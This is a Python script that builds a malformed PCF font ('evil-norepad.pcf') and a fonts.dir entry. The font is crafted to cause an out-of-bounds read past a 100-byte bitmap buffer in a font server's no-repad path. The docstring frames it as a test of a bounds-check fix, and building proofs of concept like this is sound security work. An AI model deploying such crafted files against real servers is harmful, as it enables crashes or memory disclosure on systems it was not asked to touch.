#!/usr/bin/env python3
"""
Generate a malicious PCF font that triggers an out-of-bounds read in the
no-repad bitmap path.

The font stores bitmaps at glyph pad=4 (matching x86_64 server default).
The bitmap buffer is small (100 bytes) but a glyph has metrics that
extend well past it (offset=80, width=32, height=10 -> needs 40 bytes,
so reads up to byte 120, 20 past the 100-byte buffer).

Without the fix, the no-repad path only checks that the offset is within
bounds, not the full glyph extent.

With the fix, the full glyph size is validated against the buffer.

Usage:
    python3 gen_evil_pcf_norepad.py <output_dir>

Creates <output_dir>/evil-norepad.pcf and <output_dir>/fonts.dir
"""

import struct
import sys
import os

PCF_DEFAULT_FORMAT = 0x00000000
PCF_PROPERTIES = 1
PCF_ACCELERATORS = 2
PCF_METRICS = 4
PCF_BITMAPS = 8
PCF_BDF_ENCODINGS = 32


def u32(x):
    return struct.pack("<I", x & 0xFFFFFFFF)


def i32(x):
    return struct.pack("<i", x)


def u16(x):
    return struct.pack("<H", x & 0xFFFF)


def i16(x):
    return struct.pack("<h", x)


def u8(x):
    return struct.pack("<B", x & 0xFF)


def xCharInfo(lsb, rsb, cw, asc, desc, attr):
    return i16(lsb) + i16(rsb) + i16(cw) + i16(asc) + i16(desc) + u16(attr)


# Glyph metrics: width=32 pixels, height=10
# At pad=4: BYTES_PER_ROW(32, 4) = 4, so glyph = 4 * 10 = 40 bytes
LSB = 0
RSB = 32
ASCENT = 8
DESCENT = 2
CHAR_WIDTH = 32

# Bitmap: 100 bytes total, but glyph at offset 80 needs 40 bytes (80+40=120 > 100)
# Glyph pad = 4 (index 2), matching typical x86_64 server
BITMAP_DATA_SIZE = 100  # small buffer
GLYPH_OFFSET = 80  # glyph starts near end

# Bitmap sizes for each pad option: [pad1, pad2, pad4, pad8]
# We set pad4 (index 2) = 100 to make the bitmap buffer 100 bytes
BITMAP_SIZES = [BITMAP_DATA_SIZE, BITMAP_DATA_SIZE, BITMAP_DATA_SIZE, BITMAP_DATA_SIZE]

# The font stores at glyph pad 4 (format bits [1:0] = 2 for pad=4)
# PCF_GLYPH_PAD_INDEX = format & 3
GLYPH_PAD_FORMAT = 2  # pad = 4

# --- PROPERTIES ---
properties = b""
properties += u32(PCF_DEFAULT_FORMAT)
properties += i32(1)
properties += i32(0)  # name offset
properties += u8(0)  # not string
properties += i32(0)  # value
properties += b"\x00" * 3  # padding (nprops=1, pad to 4)
properties += i32(1)  # string_size
properties += b"\x00"  # string table

# --- ACCELERATORS ---
accel = b""
accel += u32(PCF_DEFAULT_FORMAT)
accel += u8(0) * 8
accel += i32(ASCENT)
accel += i32(DESCENT)
accel += i32(0)
accel += xCharInfo(0, 0, 0, 0, 0, 0)
accel += xCharInfo(LSB, RSB, CHAR_WIDTH, ASCENT, DESCENT, 0)

# --- METRICS (1 glyph) ---
metrics = b""
metrics += u32(PCF_DEFAULT_FORMAT)
metrics += i32(1)  # nmetrics = 1
metrics += xCharInfo(LSB, RSB, CHAR_WIDTH, ASCENT, DESCENT, 0)

# --- BITMAPS ---
bitmaps = b""
bitmaps += u32(PCF_DEFAULT_FORMAT | GLYPH_PAD_FORMAT)
bitmaps += i32(1)  # nbitmaps = 1
bitmaps += u32(GLYPH_OFFSET)  # offset[0] = 80
for sz in BITMAP_SIZES:
    bitmaps += u32(sz)
bitmaps += b"\xaa" * BITMAP_DATA_SIZE

# --- BDF_ENCODINGS ---
encodings = b""
encodings += u32(PCF_DEFAULT_FORMAT)
encodings += u16(0) + u16(0)  # firstCol, lastCol
encodings += u16(0) + u16(0)  # firstRow, lastRow
encodings += u16(0)  # defaultCh
encodings += u16(0)  # encoding[0] -> metric[0]

# --- Assemble ---
TABLE_COUNT = 5
BODY_START = 8 + TABLE_COUNT * 16

properties_off = BODY_START
accel_off = properties_off + len(properties)
metrics_off = accel_off + len(accel)
bitmaps_off = metrics_off + len(metrics)
encodings_off = bitmaps_off + len(bitmaps)


def toc(type_, format_, size, offset):
    return u32(type_) + u32(format_) + u32(size) + u32(offset)


out = b"\x01fcp" + u32(TABLE_COUNT)
out += toc(PCF_PROPERTIES, 0, len(properties), properties_off)
out += toc(PCF_ACCELERATORS, 0, len(accel), accel_off)
out += toc(PCF_METRICS, 0, len(metrics), metrics_off)
out += toc(
    PCF_BITMAPS, PCF_DEFAULT_FORMAT | GLYPH_PAD_FORMAT, len(bitmaps), bitmaps_off
)
out += toc(PCF_BDF_ENCODINGS, 0, len(encodings), encodings_off)
out += properties + accel + metrics + bitmaps + encodings

output_dir = sys.argv[1] if len(sys.argv) > 1 else "."
os.makedirs(output_dir, exist_ok=True)

pcf_name = "evil-norepad.pcf"
xlfd = "-evil-norepad-medium-r-normal--10-100-75-75-c-80-iso10646-1"

with open(os.path.join(output_dir, pcf_name), "wb") as f:
    f.write(out)

with open(os.path.join(output_dir, "fonts.dir"), "w") as f:
    f.write("1\n")
    f.write(f"{pcf_name} {xlfd}\n")
